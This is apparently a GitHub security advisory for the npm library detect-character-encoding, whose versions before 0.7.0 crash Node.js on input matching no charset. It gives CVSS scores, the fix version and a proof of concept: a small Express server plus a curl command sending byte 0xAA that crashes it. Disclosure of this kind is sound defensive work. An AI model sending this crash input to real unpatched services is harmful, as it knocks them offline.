# Improper Handling of Exceptional Conditions in detect-character-encoding

High

[sonicdoe](/sonicdoe)
published
GHSA-jqfh-8hw5-fqjr
Aug 24, 2021

## Package

npm

detect-character-encoding
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

< 0.7.0

## Patched versions

0.7.0

## Description

### Impact

In detect-character-encoding v0.6.0 and earlier, data matching no charset causes the Node.js process to crash.

### Patches

The problem has been patched in [detect-character-encoding v0.7.0](https://github.com/sonicdoe/detect-character-encoding/releases/tag/v0.7.0).

### CVSS score

[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/RL:O/RC:C](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H/RL:O/RC:C)

Base Score: 7.5 (High)

Temporal Score: 7.2 (High)

Since detect-character-encoding is a library, the scoring is based on the ‚Äú[reasonable worst-case implementation scenario](https://www.first.org/cvss/v3.1/user-guide#3-7-Scoring-Vulnerabilities-in-Software-Libraries-and-Similar)‚Äù, namely, accepting data from untrusted sources over a network and passing it directly to detect-character-encoding. Depending on your specific implementation, the vulnerability‚Äôs severity in your program may be different.

### Proof of concept

```
const express = require("express");
const bodyParser = require("body-parser");
const detectCharacterEncoding = require("detect-character-encoding");

const app = express();

app.use(bodyParser.raw());

app.post("/", (req, res) => {
  const charsetMatch = detectCharacterEncoding(req.body);

  res.end(charsetMatch.encoding);
});

app.listen(3000);
```

`printf "\xAA" | curl --request POST --header "Content-Type: application/octet-stream" --data-binary @- http://localhost:3000` crashes the server.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
